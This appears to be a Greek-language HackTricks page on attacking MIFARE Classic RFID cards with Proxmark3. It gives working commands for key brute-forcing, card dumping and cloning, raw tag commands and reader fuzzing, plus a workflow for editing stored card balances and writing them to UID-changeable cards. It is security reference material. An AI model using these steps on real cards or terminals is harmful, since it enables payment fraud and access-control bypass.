# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Επίθεση σε συστήματα RFID με Proxmark3

Εγκαταστήστε τον ενεργά συντηρούμενο client RRG/Iceman Proxmark3 και το αντίστοιχο firmware και, στη συνέχεια, επιβεβαιώστε τη σύνταξη των εντολών με αυτήν την έκδοση, καθώς οι παλαιότερες εντολές που εμφανίζονται παρακάτω ενδέχεται να έχουν αλλάξει.<sup>[[1]](#references)[[5]](#references)</sup>

### Επίθεση σε MIFARE Classic 1KB

Το MIFARE Classic 1K έχει **16 sectors**, καθένα από τα οποία περιλαμβάνει **4 blocks** των **16 bytes**. Το manufacturer block 0 περιέχει τα δεδομένα UID/manufacturer και είναι μόνο για ανάγνωση σε αυθεντικές κάρτες NXP· ειδικές κάρτες-clone ή «magic» κάρτες μπορεί να επιτρέπουν την επανεγγραφή του.<sup>[[1]](#references)[[2]](#references)</sup>\
Για να αποκτήσετε πρόσβαση σε κάθε sector χρειάζεστε **2 keys** (**A** και **B**), τα οποία αποθηκεύονται στο **block 3 κάθε sector** (sector trailer). Το sector trailer αποθηκεύει επίσης τα **access bits**, τα οποία καθορίζουν τα δικαιώματα **ανάγνωσης και εγγραφής** σε **κάθε block** με τη χρήση των 2 keys.\
Τα 2 keys είναι χρήσιμα, για παράδειγμα, ώστε να επιτρέπουν την ανάγνωση αν γνωρίζετε το πρώτο και την εγγραφή αν γνωρίζετε το δεύτερο.

Μπορούν να εκτελεστούν αρκετές επιθέσεις.

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Το Proxmark3 επιτρέπει την εκτέλεση και άλλων ενεργειών, όπως **eavesdropping** σε επικοινωνία **Tag προς Reader**, για την αναζήτηση ευαίσθητων δεδομένων. Σε αυτή την κάρτα, μπορείτε απλώς να κάνετε sniff την επικοινωνία και να υπολογίσετε το χρησιμοποιούμενο κλειδί, επειδή οι **κρυπτογραφικές λειτουργίες που χρησιμοποιούνται είναι αδύναμες** και, γνωρίζοντας το plaintext και το ciphertext, μπορείτε να το υπολογίσετε (εργαλείο `mfkey64`).<sup>[[3]](#references)</sup>

#### Γρήγορη ροή εργασίας MiFare Classic για κατάχρηση αποθηκευμένης αξίας

Όταν τα τερματικά αποθηκεύουν υπόλοιπα σε κάρτες Classic, μια τυπική ροή εργασίας από την αρχή μέχρι το τέλος είναι:<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

Σημειώσεις

- Το `hf mf autopwn` συντονίζει επιθέσεις τύπου nested/darkside/HardNested, ανακτά keys και δημιουργεί dumps στον φάκελο dumps του client.<sup>[[1]](#references)</sup>
- Η εγγραφή στο block 0/UID λειτουργεί μόνο σε magic gen1a/gen2 cards. Οι κανονικές Classic cards έχουν UID μόνο για ανάγνωση.<sup>[[2]](#references)</sup>
- Πολλές εγκαταστάσεις χρησιμοποιούν «value blocks» του Classic ή απλά checksums. Βεβαιωθείτε ότι όλα τα πεδία που είναι διπλότυπα ή συμπληρωματικά, καθώς και τα checksums, παραμένουν συνεπή μετά την επεξεργασία.<sup>[[4]](#references)</sup>

Δείτε μια μεθοδολογία υψηλότερου επιπέδου και μέτρα μετριασμού στο:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Ακατέργαστες εντολές

Τα συστήματα IoT μερικές φορές χρησιμοποιούν **μη επώνυμα ή μη εμπορικά tags**. Σε αυτή την περίπτωση, μπορείτε να χρησιμοποιήσετε το Proxmark3 για να στείλετε προσαρμοσμένες **ακατέργαστες εντολές στα tags**.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

Με αυτές τις πληροφορίες, μπορείτε να αναζητήσετε πληροφορίες για την κάρτα και τον τρόπο επικοινωνίας μαζί της. Το Proxmark3 επιτρέπει την αποστολή raw εντολών, όπως: `hf 14a raw -p -b 7 26`

### Scripts

Το λογισμικό Proxmark3 διαθέτει μια προφορτωμένη λίστα **scripts αυτοματοποίησης**, τα οποία μπορείτε να χρησιμοποιήσετε για απλές εργασίες. Για να ανακτήσετε την πλήρη λίστα, χρησιμοποιήστε την εντολή `script list`. Στη συνέχεια, χρησιμοποιήστε την εντολή `script run`, ακολουθούμενη από το όνομα του script:

```
proxmark3> script run mfkeys
```

Μπορείτε να δημιουργήσετε ένα script για **fuzz tag readers**: αφού αντιγράψετε τα δεδομένα μιας **έγκυρης κάρτας**, γράψτε απλώς ένα **Lua script** που κάνει **randomize** ένα ή περισσότερα τυχαία **bytes** και ελέγχει αν ο **reader κάνει crash** σε κάποια επανάληψη.

## References

- [1] [Wiki του Proxmark3: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Wiki του Proxmark3: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [Δήλωση της NXP σχετικά με το MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [Εκμετάλλευση ευπάθειας κάρτας NFC στο KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Εγκατάσταση Linux](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
